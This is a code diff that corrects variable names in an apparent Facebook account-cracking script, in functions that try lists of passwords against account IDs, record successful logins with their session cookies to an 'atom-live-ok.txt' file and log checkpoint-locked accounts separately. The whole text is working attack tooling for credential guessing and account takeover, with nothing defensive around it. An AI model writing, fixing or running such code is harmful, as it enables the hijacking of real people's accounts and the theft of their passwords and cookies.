@@ -1012,8 +1012,8 @@ def m2(idf,pwv):
     try:
       for pw in pwv:
             data = {
-            "email": sid,
-            "password": ps,
+            "email": idf,
+            "password": pw,
             "method": "post",
             "pretty": "false",
             "format": "json",
@@ -1222,14 +1222,14 @@ def m4(idf,pwv):
                     ckk = f'https://graph.facebook.com/{uid}/picture?type=normal'
                     res = requests.get(ckk).text
                     if 'Photoshop' in res:
-                            print('\r\r\033[1;32m[atom-OK] '+uid+' | '+ps)
-                            open('/sdcard/ATOM/atom-live-ok.txt','a').write(uid+'|'+ps+'|'+cookie+'\n')
-                            ok.append(ids)
+                            print('\r\r\033[1;32m[atom-OK] '+uid+' | '+pw)
+                            open('/sdcard/ATOM/atom-live-ok.txt','a').write(uid+'|'+pw+'|'+cookie+'\n')
+                            ok.append(idf)
                             break 
                     elif 'www.facebook.com' in q['error']['message']:
-                            print('\r\r\033[1;30m[ATOM-CP] '+sid+' | '+ps)
-                            open('/sdcard/ATOM/ATOM-CP.txt','a').write(ids+'|'+ps+'\n')
-                            cp.append(ids)
+                            print('\r\r\033[1;30m[ATOM-CP] '+idf+' | '+pw)
+                            open('/sdcard/ATOM/ATOM-CP.txt','a').write(idf+'|'+pw+'\n')
+                            cp.append(idf)
                             break
                     else:
                        continue
